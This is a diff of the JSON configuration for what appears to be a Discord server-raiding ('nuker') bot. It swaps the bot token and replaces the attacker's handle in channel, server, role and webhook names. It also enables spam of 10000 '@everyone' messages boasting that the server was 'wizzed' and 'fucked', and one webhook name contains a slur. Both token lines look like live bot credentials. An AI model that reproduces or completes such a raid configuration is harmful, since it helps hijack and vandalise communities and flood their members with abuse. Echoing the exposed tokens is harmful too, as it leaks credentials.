@@ -1,15 +1,15 @@
 {
-	"Token": "OTQ0MDk3NzM3NzA2NzA4OTky.G8sXW6.b7f7XFXwkfweYKX9-pEHQqv0VD-ioXI_ic-Gyw",
+	"Token": "OTQ0MDk3NzM3NzA2NzA4OTky.G0nzLM.B7x6OzLvkh8uqqxckKZQyxRY1ABtBlFy4TPxAI",
 	"Prefix": ">",
 
-	"Channel-Names": ["fsxskey was here"], 
-	"Server-Names": ["beamed by fsxskey"],
-	"Role-Names": ["@fsxskeybeamedyou"],
-	"Reason": ["beamed by fsxskey", "fsxskey beamed me"],
+	"Channel-Names": ["no one knows was here"], 
+	"Server-Names": ["beamed by fno one knows"],
+	"Role-Names": ["@no one knowsbeamedyou"],
+	"Reason": ["beamed by no one knows", "no one knows beamed me"],
 
 	"Spam": true,
 
-	"Webhook-Names": ["@fsxskeybeamedyou", "get beamed by fsxskey retard"],
-	"Spam-Messages": ["@everyone fsxskey WIZZED YOU", "@everyone fsxskey  FUCKED YOUR SERVER"],
+	"Webhook-Names": ["@no one knowsbeamedyou", "get beamed by no one knows retard"],
+	"Spam-Messages": ["@everyone no one knows WIZZED YOU", "@everyone no one knows  FUCKED YOUR SERVER"],
 	"Spam-Amount": 10000
 }
